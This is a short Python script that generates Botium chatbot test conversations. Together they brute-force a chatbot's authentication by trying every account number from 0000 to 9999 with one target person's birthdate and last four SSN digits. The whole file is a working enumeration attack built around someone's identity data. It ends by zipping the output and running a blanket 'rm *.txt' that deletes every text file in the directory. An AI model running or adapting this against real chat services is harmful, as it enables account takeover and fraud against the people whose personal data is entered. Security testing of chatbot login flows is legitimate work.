#!/usr/bin/env python3
#TO RUN: python3 bruteGen.py

import re
import sys
import os


#f = open("botiumBrute.txt", "w")

month = 13
day = 32
year = 100
ssn = 10000
account = 10000
#f.write("Brute force script for Botium\n")

dob = '1'
social = '1'

while True:
    dob = input("Enter target birthdate (MMDDYY): ")
    if not re.match(r'^[0-1][0-9][0-3][0-9]{3}$',dob):
        print("invalid input")
    else:
        break

while True:
    social = input("Enter target last 4 digits of SSN: ")
    if not re.match(r'[0-9]{4}$',social):
        print("invalid input")
    else:
        break

for a in range(account):
    with open(str(a) + '.convo.txt', "w") as f:
        f.write("Account " + str(a) + "\n" )
        f.write("\n")
        f.write("#me\n")
        f.write("Authenticate\n")
        f.write("\n")
        f.write("#bot\n")
        f.write("Ok, can I have an account number please?\n")
        f.write("\n")
        f.write("#me\n")
        f.write(str(a).zfill(4) + "\n")
        f.write("\n")
        f.write("#bot\n")
        f.write("Please give me your birthdate (MMDDYY) and the last 4 of your social, separated by a space to authenticate\n")
        f.write("\n")
        f.write("#me\n")
        f.write(dob + " " + social + "\n")
        f.write("\n")
        f.write("#bot\n")
        f.write("Authenticated! Thank you!\n")
        f.close()
print("script generation complete")

os.system('zip -r ' + dob + '-' + social + '.zip *.txt')
os.system('rm *.txt')
#f.close()
